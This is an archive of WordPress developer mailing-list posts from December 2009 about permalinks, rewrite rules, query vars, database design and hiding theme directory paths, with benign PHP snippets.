From patrik.bona at mrhead.sk  Thu Dec  3 14:36:11 2009
From: patrik.bona at mrhead.sk (=?ISO-8859-1?Q?Patrik_B=F3na?=)
Date: Thu, 03 Dec 2009 15:36:11 +0100
Subject: [wp-hackers] Internal links
In-Reply-To: <3EB8D702-1028-448D-907F-B4FB4E8C0767@anthony.geek.nz>
References: <da7069940912030549y42fac69k22d90efeccb77863@mail.gmail.com>
	<3EB8D702-1028-448D-907F-B4FB4E8C0767@anthony.geek.nz>
Message-ID: <4B17CCDB.6040206@mrhead.sk>

I think, that you have probably missed the point :)

I think that Vlad wants links in form:
/2009/10/10/article instead of http://example.com/2009/10/10/article

Vlad i don't know if it is possible to set it somewhere, but this simple 
code should works:

function change_permalinks($link) {
        return str_replace(get_bloginfo('url'), '', $link);
}
add_filter('post_link','change_permalinks');
add_filter('page_link','change_permalinks');

Best regards

Patrik

Anthony Cole wrote:
> Enable Permalinks in Settings -> Permalinks :)
>
> -ac
>
> On 4/12/2009, at 2:49 AM, Vlad GURDIGA wrote:
>
>   
>> Hello,
>>
>> Is there any reason why one cannot create an internal link? Like:
>> ./2009/12/03/article-title.
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>     
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>   


From otto at ottodestruct.com  Thu Dec  3 14:54:14 2009
From: otto at ottodestruct.com (Otto)
Date: Thu, 3 Dec 2009 08:54:14 -0600
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <C467409A-DE43-49A7-BE43-EF6FC0DE5A34@newclarity.net>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com> 
	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com> 
	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>
	<161617690912021422k2abfe799v1c99190dca3f5666@mail.gmail.com> 
	<C467409A-DE43-49A7-BE43-EF6FC0DE5A34@newclarity.net>
Message-ID: <161617690912030654x794bbbf2xe2c2ea644ad0c7c0@mail.gmail.com>

On Wed, Dec 2, 2009 at 4:41 PM, Mike Schinkel
<mikeschinkel at newclarity.net> wrote:
>> I don't like your particular visions about URL routing, because I
>> think you're thinking too narrowly and focusing on your specific needs
>> instead of having a wider scope, but I'm not generically opposed to
>> making URLs easier to work with.
>
> My reaction is to think you don't understand my visions because I'm looking to make it more generic not less, and my perception of your criticisms is that you are trying to constrain it to be less so. ?Of course that's all my perception which is probably not the reality.

Absolutely not the reality, because I'd say the exact same thing, only
flip-flopped. You're making your focus too narrow. Your whole idea of
tying a rewrite URL down to a custom template is far LESS generic than
the existing system.

In other words, the examples you have given are a *subset* of existing
functionality. It's already more generic and more capable than what
you want it to be able to do. You're trying to constrain the system to
your specific needs. I'm trying to not do that.

> So let's get pass this and try to figure out what works. ?Can you explain what you think my vision is (so I can either agree or correct it) and then why you think that vision is too narrow by giving counter examples?

The example you've posted several times is something like this:
add_custom_url( array(
  'name'          => 'product-page',
  'url_type'      => 'single-post',
  'url_template'  => 'products/{product_slug}',
  'template_file' => 'custom/product.php',
  'post_type'     => 'product',
));

That's very, very specific. You're basically defining a custom-url and
attaching it to a fixed template and template file with a specially
defined variable name, hooked to posts, etc, etc. Even if you assume
that there's multiple types here, it's much *less* flexible than what
is already in the core. It may be simpler and easier to call something
along the lines of your version, but it's limited in its capabilities
to the types of URL direction that you have pre-programmed into it.

That's what I mean by specific vs. generic. Generic is
add_rewrite_url, which lets you use a simple regexp to define any sort
of rewrite you want. Generic is template_redirect, which lets you
redirect to any template you want based on any criteria you can dream
up.

Your "vision" seems to be focused on pre-defined ways of doing things,
in ways that you have given custom names to (like "single-post").

-Otto

From otto at ottodestruct.com  Thu Dec  3 15:00:57 2009
From: otto at ottodestruct.com (Otto)
Date: Thu, 3 Dec 2009 09:00:57 -0600
Subject: [wp-hackers] Internal links
In-Reply-To: <da7069940912030549y42fac69k22d90efeccb77863@mail.gmail.com>
References: <da7069940912030549y42fac69k22d90efeccb77863@mail.gmail.com>
Message-ID: <161617690912030700p5ed95487l262de6e8621a82db@mail.gmail.com>

No, but there are plenty of reasons that one should not create those
sorts of links.

Your content doesn't have a fixed location. The same content can be
shown at http://example.com (the homepage),
http://example.com/2009/12/article-name (the single post page),
http://example.com/archives/2009/12 (the monthly archive pages), in an
RSS or ATOM feed, on other sites, in Google, etc...

No relative link is guaranteed to work on all those pages, because
relative links are relative to the *current* page location, which can
be many things.

An absolute link is better, because it always works, no matter where
your content is displayed from.

Always use absolute links if you want things to absolutely link to the
right place.

-Otto
Sent from Memphis, TN, United States


On Thu, Dec 3, 2009 at 7:49 AM, Vlad GURDIGA <gurdiga at gmail.com> wrote:
> Hello,
>
> Is there any reason why one cannot create an internal link? Like:
> ./2009/12/03/article-title.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From otto at ottodestruct.com  Thu Dec  3 15:12:59 2009
From: otto at ottodestruct.com (Otto)
Date: Thu, 3 Dec 2009 09:12:59 -0600
Subject: [wp-hackers] Database structure Wordpress
In-Reply-To: <C98C6445-D7ED-44CE-AA53-EB3FAFD0022B@gmail.com>
References: <C98C6445-D7ED-44CE-AA53-EB3FAFD0022B@gmail.com>
Message-ID: <161617690912030712v5edc0858uc8b6d9bfaef26260@mail.gmail.com>

You're not going to get a whole lot of support for this idea. Mainly
because it's been demonstrated that such a design is less efficient
and slower than the current scheme of keeping things together.

Let's say you have a table for each post type. What happens when you
need to pull from more than one post type and interleave them together
based on, say, date? Now you're pulling from two tables. And since you
want metadata to be columns, they don't match each other either. So
you need two SELECTs and then PHP code to mix them up. Whereas if you
keep all posts in the same table with a post_type column, it's one
SELECT and no special PHP.

Metadata as columns doesn't make any sense either. The only reason to
have a column is if every post, or most of them, will have that data
filled in. Also, having a column usually means pulling the data from
that column every time, else you'd have to requery for it later
anyway. And if you have to requery for it anyway, then it's more
efficient to store the data in a separate meta table, using key value
pairs. Indexing makes such a query faster, and the space requirements
are much less since you don't have extraneous columns.

It's all well and good to have good database design, but the
difference is that good design does not equate to "faster" in real
world applications. The goal of "high performance" is often in direct
conflict with correct relational database design. Took me a long time
before I figured that one out.

WordPress's current design is geared towards very high performance,
and pretty much ignores "correct" design. There are a few improvements
that can be made with regards to indexing (and many of them have been
made in 2.9), but redesigning to be "correct" simply ain't going to
get a lot of traction, sort of thing.

-Otto



On Wed, Dec 2, 2009 at 7:31 PM, Florian Woegerer <nexflo at gmail.com> wrote:
> The Database structure of Wordpress should be rethought if Wordpress is going to move to a more and more CMS's based system. (last week's CMS Award seems that this is indeed the case)
>
> In times of PDO, Doctrine etc. creating a sweet Database layout shouldnt be the biggest issue no more?
>
> Why not update the sql tables names when creating a new page type? i.e. we create a new post/page type titled "cars"...why not create a new database table entitled cars with all default fields in there. Custom fields would simple add a new Field/Column into that table. in this way we would have an extremly clean database design, which other applications can tap into easily as well. This would result in a high performance database layout and offer a great new way to design flexible, scalable applications.
>
> The benefit would be extremely great too all powerusers/cms users etc. and normal "blog" users wouldn't feel a thing as for them nothing changes. (sure the huge amount of plugins would need a wrapper till things are updated)
>
> Wordpress doesn't get bloated, but just more mature.
> Using convention over configuration would allows wordpress to tap into existing databases which have an incremental id and use that data instantly. (if the database layout fits a certain style and some additional fields (published, author etc. are added)
>
> would love to hear some thoughts on this
>
> Thanks Florian
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From gurdiga at gmail.com  Thu Dec  3 15:19:56 2009
From: gurdiga at gmail.com (Vlad GURDIGA)
Date: Thu, 3 Dec 2009 17:19:56 +0200
Subject: [wp-hackers] Internal links
In-Reply-To: <4B17CCDB.6040206@mrhead.sk>
References: <da7069940912030549y42fac69k22d90efeccb77863@mail.gmail.com> 
	<3EB8D702-1028-448D-907F-B4FB4E8C0767@anthony.geek.nz>
	<4B17CCDB.6040206@mrhead.sk>
Message-ID: <da7069940912030719o7945cecdi78d6cbf326f86e6d@mail.gmail.com>

On Thu, Dec 3, 2009 at 4:36 PM, Patrik B?na <patrik.bona at mrhead.sk> wrote:
> I think, that you have probably missed the point :)
>
> I think that Vlad wants links in form:
> /2009/10/10/article instead of http://example.com/2009/10/10/article
>
> Vlad i don't know if it is possible to set it somewhere, but this simple
> code should works:
>
> function change_permalinks($link) {
> ? ? ? return str_replace(get_bloginfo('url'), '', $link);
> }
> add_filter('post_link','change_permalinks');
> add_filter('page_link','change_permalinks');

That looks like a good start!

Thank you!


>
> Best regards
>
> Patrik
>
> Anthony Cole wrote:
>>
>> Enable Permalinks in Settings -> Permalinks :)
>>
>> -ac
>>
>> On 4/12/2009, at 2:49 AM, Vlad GURDIGA wrote:
>>
>>
>>>
>>> Hello,
>>>
>>> Is there any reason why one cannot create an internal link? Like:
>>> ./2009/12/03/article-title.
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From pete at jointforcestech.com  Thu Dec  3 15:26:21 2009
From: pete at jointforcestech.com (Pete Mall)
Date: Thu, 3 Dec 2009 07:26:21 -0800
Subject: [wp-hackers] WP exploit ,
	was Re: [Webmaster Central Help] Site 	hacked.
In-Reply-To: <59e7f3130912030343t69eda796y908a23854600b0d@mail.gmail.com>
References: <59e7f3130912020107t61ea9ba8nb67ecdff711f3aac@mail.gmail.com> 
	<7235ce780912020129n31b10fabq2f2757844c616d21@mail.gmail.com> 
	<59e7f3130912020632u2d28cef7hd38ae71bddf81905@mail.gmail.com> 
	<7235ce780912020655h13599806q348ed3187e8b6d03@mail.gmail.com> 
	<4B16A3BF.4050508@gmail.com>
	<e1202cb10912021030i1e43f71ex42ce729c21e01f88@mail.gmail.com> 
	<d7153760912021050r74d7c301r176957ba49b07176@mail.gmail.com> 
	<012801ca7381$70d0fbc0$5272f340$@com>
	<59e7f3130912030343t69eda796y908a23854600b0d@mail.gmail.com>
Message-ID: <7f49e8010912030726h45c2657aoaca0bf47f5c079e3@mail.gmail.com>

Could you share the exploit files with us. Also, what type of hosting are
you on and the structure of the sites you have on this hosting account.

--
Pete Mall
developersmind.com


On Thu, Dec 3, 2009 at 3:43 AM, Malaiac <malaiac at gmail.com> wrote:

> Most hacked files were actually plugins files in another install of
> wordpress (on a subdomain), while the subdomain itself was not
> actually hacked (or not so obviously).
> I'm going to rm * and make fresh installs on both subdomains.
>
> M
>
> 2009/12/2 Brad Williams <bradw at illiams.com>:
> > Also remember if you have multiple websites on the same hosting account
> they
> > may also be compromised and should be checked.  Even if they aren't
> showing
> > signs of being hacked they could be.
> >fo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From burobjorn at gmail.com  Thu Dec  3 15:30:39 2009
From: burobjorn at gmail.com (Bjorn Wijers)
Date: Thu, 03 Dec 2009 16:30:39 +0100
Subject: [wp-hackers] How to create a custom url with extra delimiter?
Message-ID: <4B17D99F.9030907@gmail.com>

Hi,

I have the following working non pretty urls url:

http://site.dev/?pagename=somepage&myfilter=filtervalue&paged=1

And I would like to rewrite this to:

http://site.dev/somepage/myfilter/filtervalue/page/1

The filtervalue may also exists as a page title, therefor I need to add
the myfilter part in the url. I need pagination to work as well.

I'm pulling my hair out, since none of the regex I tried seem to work.
My last attempt, which is called by the action:

add_action('generate_rewrite_rules', '_my_add_rewrite_rules');

[code]
function _my_add_rewrite_rules( $wp_rewrite ) {
  $new_rules = array(
    'somepage/myfilter/(.+)' =>
    'index.php?pagename=somepage&myfilter=' .
     $wp_rewrite->preg_index(1) );

  $wp_rewrite->rules = $new_rules + $wp_rewrite->rules;
}
[/code]

Any help would be much appreciated!

-- 

met vriendelijke groet,
Bjorn Wijers

* b u r o b j o r n .nl *
digitaal vakmanschap | digital craftsmanship

Concordiastraat 68-126
3551 EM Utrecht
The Netherlands

phone: +31 6 49 74 78 70
http://www.burobjorn.nl

From me at anthony.geek.nz  Thu Dec  3 15:33:58 2009
From: me at anthony.geek.nz (Anthony Cole)
Date: Fri, 4 Dec 2009 04:33:58 +1300
Subject: [wp-hackers] How to create a custom url with extra delimiter?
In-Reply-To: <4B17D99F.9030907@gmail.com>
References: <4B17D99F.9030907@gmail.com>
Message-ID: <C9D10355-8D13-4E1D-9A72-47DDD1FB3B87@anthony.geek.nz>

Have you registered your query_vars? all GETs are stripped out of rewritten urls, just fyi.

You need to do something like this...

function bell_queryvars( $vars ) {
	$vars[] = 'myfilter';
	return apply_filters('bell_vars', $vars);
}

add_filter('generate_rewrite_rules', 'bell_add_rewrite');

-ac

On 4/12/2009, at 4:30 AM, Bjorn Wijers wrote:

> Hi,
> 
> I have the following working non pretty urls url:
> 
> http://site.dev/?pagename=somepage&myfilter=filtervalue&paged=1
> 
> And I would like to rewrite this to:
> 
> http://site.dev/somepage/myfilter/filtervalue/page/1
> 
> The filtervalue may also exists as a page title, therefor I need to add
> the myfilter part in the url. I need pagination to work as well.
> 
> I'm pulling my hair out, since none of the regex I tried seem to work.
> My last attempt, which is called by the action:
> 
> add_action('generate_rewrite_rules', '_my_add_rewrite_rules');
> 
> [code]
> function _my_add_rewrite_rules( $wp_rewrite ) {
>  $new_rules = array(
>    'somepage/myfilter/(.+)' =>
>    'index.php?pagename=somepage&myfilter=' .
>     $wp_rewrite->preg_index(1) );
> 
>  $wp_rewrite->rules = $new_rules + $wp_rewrite->rules;
> }
> [/code]
> 
> Any help would be much appreciated!
> 
> -- 
> 
> met vriendelijke groet,
> Bjorn Wijers
> 
> * b u r o b j o r n .nl *
> digitaal vakmanschap | digital craftsmanship
> 
> Concordiastraat 68-126
> 3551 EM Utrecht
> The Netherlands
> 
> phone: +31 6 49 74 78 70
> http://www.burobjorn.nl
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From nexflo at gmail.com  Thu Dec  3 15:41:11 2009
From: nexflo at gmail.com (Florian Woegerer)
Date: Thu, 3 Dec 2009 16:41:11 +0100
Subject: [wp-hackers] wp-content/themes/XY in source-code and direct links
	to uploaded files
In-Reply-To: <mailman.6897.1259854251.16651.wp-hackers@lists.automattic.com>
References: <mailman.6897.1259854251.16651.wp-hackers@lists.automattic.com>
Message-ID: <53B73487-558B-4070-A424-B8CB1ABDDC93@gmail.com>

Wordpress always links its stylesheets, images, javascripts to its wp-content/themes/XY/ directory ,same goes for uploads etc.

is there a way to simple hide the wp-content/themes from the source to not reveal that wp is used and to have a cleaner structure in the code?

mod_rewrite or any other solution available here?

From burobjorn at gmail.com  Thu Dec  3 15:49:45 2009
From: burobjorn at gmail.com (Bjorn Wijers)
Date: Thu, 03 Dec 2009 16:49:45 +0100
Subject: [wp-hackers] How to create a custom url with extra delimiter?
In-Reply-To: <C9D10355-8D13-4E1D-9A72-47DDD1FB3B87@anthony.geek.nz>
References: <4B17D99F.9030907@gmail.com>
	<C9D10355-8D13-4E1D-9A72-47DDD1FB3B87@anthony.geek.nz>
Message-ID: <4B17DE19.3070205@gmail.com>

Thank you for your quick reply!

> Have you registered your query_vars? all GETs are stripped out of rewritten urls, just fyi.

Yes, I have added the myfilter var to the query variables. The problem
however still exists :(


> You need to do something like this...
> 
> function bell_queryvars( $vars ) {
> 	$vars[] = 'myfilter';
> 	return apply_filters('bell_vars', $vars);
> }
> 
> add_filter('generate_rewrite_rules', 'bell_add_rewrite');
> 
> -ac
> 
> On 4/12/2009, at 4:30 AM, Bjorn Wijers wrote:
> 
>> Hi,
>>
>> I have the following working non pretty urls url:
>>
>> http://site.dev/?pagename=somepage&myfilter=filtervalue&paged=1
>>
>> And I would like to rewrite this to:
>>
>> http://site.dev/somepage/myfilter/filtervalue/page/1
>>
>> The filtervalue may also exists as a page title, therefor I need to add
>> the myfilter part in the url. I need pagination to work as well.
>>
>> I'm pulling my hair out, since none of the regex I tried seem to work.
>> My last attempt, which is called by the action:
>>
>> add_action('generate_rewrite_rules', '_my_add_rewrite_rules');
>>
>> [code]
>> function _my_add_rewrite_rules( $wp_rewrite ) {
>>  $new_rules = array(
>>    'somepage/myfilter/(.+)' =>
>>    'index.php?pagename=somepage&myfilter=' .
>>     $wp_rewrite->preg_index(1) );
>>
>>  $wp_rewrite->rules = $new_rules + $wp_rewrite->rules;
>> }
>> [/code]
>>
>> Any help would be much appreciated!
>>
>> -- 
>>
>> met vriendelijke groet,
>> Bjorn Wijers
>>
>> * b u r o b j o r n .nl *
>> digitaal vakmanschap | digital craftsmanship
>>
>> Concordiastraat 68-126
>> 3551 EM Utrecht
>> The Netherlands
>>
>> phone: +31 6 49 74 78 70
>> http://www.burobjorn.nl
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 


-- 

met vriendelijke groet,
Bjorn Wijers

* b u r o b j o r n .nl *
digitaal vakmanschap | digital craftsmanship

Concordiastraat 68-126
3551 EM Utrecht
The Netherlands

phone: +31 6 49 74 78 70
http://www.burobjorn.nl

From batmoo at gmail.com  Thu Dec  3 15:49:36 2009
From: batmoo at gmail.com (Mohammad Jangda)
Date: Thu, 3 Dec 2009 10:49:36 -0500
Subject: [wp-hackers] wp-content/themes/XY in source-code and direct
	links to uploaded files
In-Reply-To: <53B73487-558B-4070-A424-B8CB1ABDDC93@gmail.com>
References: <mailman.6897.1259854251.16651.wp-hackers@lists.automattic.com> 
	<53B73487-558B-4070-A424-B8CB1ABDDC93@gmail.com>
Message-ID: <eaaa36c90912030749j7c4ecc78j59aa48b73cef7673@mail.gmail.com>

>
> is there a way to simple hide the wp-content/themes from the source to not
> reveal that wp is used and to have a cleaner structure in the code?


Here's a good place to start:
http://codex.wordpress.org/Editing_wp-config.php#Moving_wp-content

I believe the same can be done with the wp-admin and wp-includes folders --
someone correct me if I'm wrong on this.

From if.website at gmail.com  Thu Dec  3 15:52:15 2009
From: if.website at gmail.com (Austin Matzko)
Date: Thu, 3 Dec 2009 09:52:15 -0600
Subject: [wp-hackers] How to create a custom url with extra delimiter?
In-Reply-To: <4B17DE19.3070205@gmail.com>
References: <4B17D99F.9030907@gmail.com>
	<C9D10355-8D13-4E1D-9A72-47DDD1FB3B87@anthony.geek.nz>
	<4B17DE19.3070205@gmail.com>
Message-ID: <674b4a3b0912030752j4d94819ahd8b8034de81c6c0@mail.gmail.com>

On Thu, Dec 3, 2009 at 9:49 AM, Bjorn Wijers <burobjorn at gmail.com> wrote:
> Thank you for your quick reply!
>
>> Have you registered your query_vars? all GETs are stripped out of rewritten urls, just fyi.
>
> Yes, I have added the myfilter var to the query variables. The problem
> however still exists :(

Have you flushed the rewrite rules to rebuild them? ($wp_rewrite->flush_rules())

From otto at ottodestruct.com  Thu Dec  3 16:04:56 2009
From: otto at ottodestruct.com (Otto)
Date: Thu, 3 Dec 2009 10:04:56 -0600
Subject: [wp-hackers] The problem with WP_Rewrite <<< RE: Options for
	Controller - Views
In-Reply-To: <37AD065D-6910-4110-A9DA-21B63ED65CCA@newclarity.net>
References: <4B0C80C1.5070502@santosj.name>
	<161617690911261124v3a8258abl46c603abdf5efe9a@mail.gmail.com> 
	<8B9D5A49-3CE6-4661-9B3B-EBCF617B3E99@newclarity.net>
	<161617690911271131t6d21b3f6y35bc814f73f09a06@mail.gmail.com> 
	<E7B7D271-B75D-4561-BE5F-8E054D62F7A7@newclarity.net>
	<161617690911281113q2e5f0460m12364d97e8a1cbfa@mail.gmail.com> 
	<37AD065D-6910-4110-A9DA-21B63ED65CCA@newclarity.net>
Message-ID: <161617690912030804k11df1471h18f98d298b5a8e7@mail.gmail.com>

On Sat, Nov 28, 2009 at 4:24 PM, Mike Schinkel
<mikeschinkel at newclarity.net> wrote:
>> Okay. I'm absolutely certain I can create a demo that showcases a
>> better way to do these than you're describing. I'll work on it soon.
>
> I look forward to it, and appreciate it in advance.

Mike,

I said before that I'd give you a simple example. This might be too
simple, but it should explain a few things.

function plugin_add_custom_urls() {
  add_rewrite_rule('products/(.*)[/]?$',
'index.php?post_type=$matches[1]', 'top');
  add_rewrite_tag('%post_type%','.*');
}
add_action('init', 'plugin_add_custom_urls');

add_rewrite_rule adds the rewrite rule to do products/whatever. The
"whatever" gets set to the post_type query variable.

add_rewrite_tag lets the post_type variable exist and sets it in the
query_vars and such. Also ensures that it gets set in the global
$wp_query.

Now, because wp_query already supports post_type as an input
parameter, I don't have to change anything along those lines. If it
didn't, I'd have to add a filter hooked to 'posts_where' to add the
additional where clause.

But, the resulting query SQL that this generates is this:
SELECT SQL_CALC_FOUND_ROWS  wp_posts.* FROM wp_posts  WHERE 1=1  AND
wp_posts.post_type = 'whatever' AND (wp_posts.post_status = 'publish'
OR wp_posts.post_author = 1 AND wp_posts.post_status = 'private')
ORDER BY wp_posts.post_date DESC LIMIT 0, 10

Note that it's selecting on wp_posts.post_type='whatever', which is
something I think you wanted to do.

You also wanted to redirect to a specific custom template based on
this, I believe. That would be along these lines:

function plugin_add_template() {
  if (get_query_var('post_type') == 'whatever') {
    locate_template(array('custom/product.php'),true);
    exit;
  }
}
add_action('template_redirect', 'plugin_add_template');


If I wanted it to get a specific post instead, I'd have used 'post_id'
instead of post_type. Since post_id is already one of the rewrite
tags, I could leave off the add_rewrite_tag call for that, but add a
new one for the special product variable. That would look something
like this:
add_rewrite_rule('products/(.*)[/]?$',
'index.php?post_id=12345&product=$matches[1]', 'top');
add_rewrite_tag('%product%','.*');

Now, in my template redirection function, I could do
get_query_var('product') and act accordingly. Since we set the
post_id, the wp_query we get there is going to have the post with ID
12345, unless I add more filters to modify its contents.

Does this help explain things a bit better? I know it's not a complete
example, but these seem to accomplish your goals to me. They add a
rewrite, let you modify the query a bit, and provide you with a custom
template. You could wrap them in a function to make them easier to
call as well, I suppose.

-Otto
Sent from Memphis, TN, United States

From mikeschinkel at newclarity.net  Thu Dec  3 16:10:47 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Thu, 3 Dec 2009 11:10:47 -0500
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <161617690912030654x794bbbf2xe2c2ea644ad0c7c0@mail.gmail.com>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>
	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com>
	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>
	<161617690912021422k2abfe799v1c99190dca3f5666@mail.gmail.com>
	<C467409A-DE43-49A7-BE43-EF6FC0DE5A34@newclarity.net>
	<161617690912030654x794bbbf2xe2c2ea644ad0c7c0@mail.gmail.com>
Message-ID: <8E9CD77F-65C2-4B8F-BF84-15725466DDCA@newclarity.net>

On Dec 3, 2009, at 9:54 AM, Otto wrote:
> Absolutely not the reality, because I'd say the exact same thing, only
> flip-flopped. You're making your focus too narrow. Your whole idea of
> tying a rewrite URL down to a custom template is far LESS generic than
> the existing system.
> 
> In other words, the examples you have given are a *subset* of existing
> functionality. It's already more generic and more capable than what
> you want it to be able to do. You're trying to constrain the system to
> your specific needs. I'm trying to not do that.

There I have to disagree.  I am not trying to constrain the system, I am trying to creating a layer that simplifies a very common use case. The existing layer still exists when my layer is on top of it so there is nothing constrained, only common use cases simplified.

Programmers add simplifying layers all the time while leaving the more capable complex layers below, and there are myriad examples within WordPress core of the same thing.  Given that WordPress has a focus on usability I find it counter to the mission to push to maintain only the more complex approaches.

> 
>> So let's get pass this and try to figure out what works.  Can you explain what you think my vision is (so I can either agree or correct it) and then why you think that vision is too narrow by giving counter examples?
> 
> The example you've posted several times is something like this:
> add_custom_url( array(
>  'name'          => 'product-page',
>  'url_type'      => 'single-post',
>  'url_template'  => 'products/{product_slug}',
>  'template_file' => 'custom/product.php',
>  'post_type'     => 'product',
> ));
> 
> That's very, very specific. You're basically defining a custom-url and
> attaching it to a fixed template and template file with a specially
> defined variable name, hooked to posts, etc, etc.

I assume "defining a custom-url is okay", right? Otherwise what are we discussing?

I don't understand the "attaching to a fixed template" issue. As opposed to what, a variable template?  

BTW, my code that I sent you also supports callbacks, is that what you meant? i.e.

add_custom_url(	array(
  'url_template' => 'foo-page',
  'url_type' => 'callback',
  'callback' => 'do_foo_page',
));

> and template file

Are you saying WordPress shouldn't support custom post templates?

> with a specially
> defined variable name,

You mean like how permalinks have special names like "postname" and "monthnum?"   So what's wrong here?

> hooked to posts, etc, etc.

Yes, a custom post type. From what I've seen that's the most common use case for custom URLs by far.  You have an issue with simplifying common use cases?

>  etc, etc.


Are there actually other things you take issue with or just embellishment without actual additional considerations?

Essentially you are complaining about the existence of those things without which it would not be possible to match a URL and route it to the most common use case, a custom post type. And it seems you made the assumption that handling the common use case makes it not possible to handle other use cases? Of course that would be a failed assumption.

You could of course make it more object-oriented and decouple the fact that a custom post type uses a custom url such as below but in my experience that's just not the way things are done in WordPress.  Decoupling common use cases just adds complexity to the normal case and WordPress is about making things easier, not about making them harder.


$product_url = add_custom_url( array(
 'name'          => 'product-page',
 'url_template'  => 'products/{product_slug}',
 'template_file' => 'custom/product.php',
));
attach_url_to_custom_post( $product_url, 'product');

> Even if you assume
> that there's multiple types here, it's much *less* flexible than what
> is already in the core. It may be simpler and easier to call something
> along the lines of your version, but it's limited in its capabilities
> to the types of URL direction that you have pre-programmed into it.

Again, providing a simplifying layer that handles the use cases  that are going to occur far more often than others (without removing the existing layer) is A Good Thing(tm).

If you feel the need to continue criticizing please explain why it's bad to have a simplifying layer instead of arguing for a layer that does thing exactly as complicated as the layer below it.

> That's what I mean by specific vs. generic. Generic is
> add_rewrite_url, which lets you use a simple regexp to define any sort
> of rewrite you want. Generic is template_redirect, which lets you
> redirect to any template you want based on any criteria you can dream
> up.

Are you actually arguing that WordPress should not support any additional layers that simplify things?  Especially things that many people have expressed both an interest in doing and a concern that it's far too difficult?  Seriously?

> Your "vision" seems to be focused on pre-defined ways of doing things,
> in ways that you have given custom names to (like "single-post").

There are custom names for concepts identified by the core developers littered throughout WordPress core. Just look at init_query_flags() in query.php or wp_options table for a littering of custom names. Custom names are not a bad thing. (Besides, how would you identify a concept in core without introducing a custom name?)

And my "vision" (which you incorrectly characterize) is to identify common use cases and make them easy.  To handle the common use case of a custom post type is currently *not* easy, but should be.

-Mike Schinkel

From pete at jointforcestech.com  Thu Dec  3 16:11:26 2009
From: pete at jointforcestech.com (Pete Mall)
Date: Thu, 3 Dec 2009 08:11:26 -0800
Subject: [wp-hackers] wp-content/themes/XY in source-code and direct
	links to uploaded files
In-Reply-To: <eaaa36c90912030749j7c4ecc78j59aa48b73cef7673@mail.gmail.com>
References: <mailman.6897.1259854251.16651.wp-hackers@lists.automattic.com> 
	<53B73487-558B-4070-A424-B8CB1ABDDC93@gmail.com>
	<eaaa36c90912030749j7c4ecc78j59aa48b73cef7673@mail.gmail.com>
Message-ID: <7f49e8010912030811n2823980fl50648ed131daea86@mail.gmail.com>

I don't believe you can move wp-admin.

On Thu, Dec 3, 2009 at 7:49 AM, Mohammad Jangda <batmoo at gmail.com> wrote:

> >
> > is there a way to simple hide the wp-content/themes from the source to
> not
> > reveal that wp is used and to have a cleaner structure in the code?
>
>
> Here's a good place to start:
> http://codex.wordpress.org/Editing_wp-config.php#Moving_wp-content
>
> I believe the same can be done with the wp-admin and wp-includes folders --
> someone correct me if I'm wrong on this.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From harish.mlists at gmail.com  Thu Dec  3 16:25:15 2009
From: harish.mlists at gmail.com (Harish Narayanan)
Date: Thu, 03 Dec 2009 16:25:15 +0000
Subject: [wp-hackers] wp-content/themes/XY in source-code and direct
 links to uploaded files
In-Reply-To: <53B73487-558B-4070-A424-B8CB1ABDDC93@gmail.com>
References: <mailman.6897.1259854251.16651.wp-hackers@lists.automattic.com>
	<53B73487-558B-4070-A424-B8CB1ABDDC93@gmail.com>
Message-ID: <4B17E66B.8050503@gmail.com>

Florian Woegerer wrote:
> Wordpress always links its stylesheets, images, javascripts to its wp-content/themes/XY/ directory ,same goes for uploads etc.
> 
> is there a way to simple hide the wp-content/themes from the source to not reveal that wp is used and to have a cleaner structure in the code?

Yes, one simple solution is to create a symbolic link to these places
and use those links instead.

e.g. On my journal, I have /actuality/ -> /wp-content/themes/actuality-two/

I am not doing this to hide WordPress use in particular, I just think
the output XHTML looks nicer this way.

Harish

From mikeschinkel at newclarity.net  Thu Dec  3 16:37:07 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Thu, 3 Dec 2009 11:37:07 -0500
Subject: [wp-hackers] The problem with WP_Rewrite <<< RE: Options for
	Controller - Views
In-Reply-To: <161617690912030804k11df1471h18f98d298b5a8e7@mail.gmail.com>
References: <4B0C80C1.5070502@santosj.name>
	<161617690911261124v3a8258abl46c603abdf5efe9a@mail.gmail.com>
	<8B9D5A49-3CE6-4661-9B3B-EBCF617B3E99@newclarity.net>
